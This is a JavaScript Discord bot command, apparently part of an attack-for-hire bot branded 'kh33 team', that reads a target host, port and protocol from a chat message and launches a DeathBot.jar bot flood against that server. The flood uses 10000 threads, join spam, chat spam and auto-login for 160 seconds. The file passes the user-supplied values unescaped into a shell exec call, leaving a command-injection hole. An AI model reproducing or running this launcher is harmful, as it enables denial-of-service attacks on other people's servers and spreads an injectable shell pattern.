const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
const roleName = message.member.roles.cache.find(r => r.name === "[ᴀᴛᴛᴀᴄᴋ-ʙᴀsɪᴄ]")

if (message.channel.id != room) {
	return;
  }

if (roleName) {
    const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`Only Crack server !`")
	message.channel.send(embed1);
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`Attack command $chatbot <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$chatbot <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
        .setDescription("Please Send valid Commnds !")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -jar DeathBot.jar -move true -ping false -pingamount 10 -host ${host} -port ${port} -threads 10000 -nicksize 8 -stay true -stayl 2000 -nicks NICKS -spam true -ach true -joinamount 3 -doublej true -protocol ${protocol} -msg 'by_bots_kh33TEAM' -amount 6 -proxymode NONE -login '/login 123456' -register '/register 123456' -time 160 -debug true`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **kh33 team V1.0** 🔥')
	.setTimestamp()
	.setDescription("**► The attack has stopped 🛑**")
	.setFooter('© dev 1.5mq.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 message.react('✅');
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif", "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif", "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif" , "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **kh33 team V1.0** 🔥')
	.setTimestamp()
	.setTimestamp()	.setDescription("**User** : `" + message.author.username + "` \n **Host** : `" + host + "` \n **Port** : `" + port + "` \n **Protocol** : `" + protocol + "`\n \n **🌐 Methods** : `chatbot` \n **⌛ Seconds** : `160`")
	.setFooter('© dev kh33 team.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
 message.react('✅');
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['chatbot'],
  permLevel: 0
}

exports.help = {
  name: 'chatbot',
  description: 'Özel',
  usage: 'chatbot'
}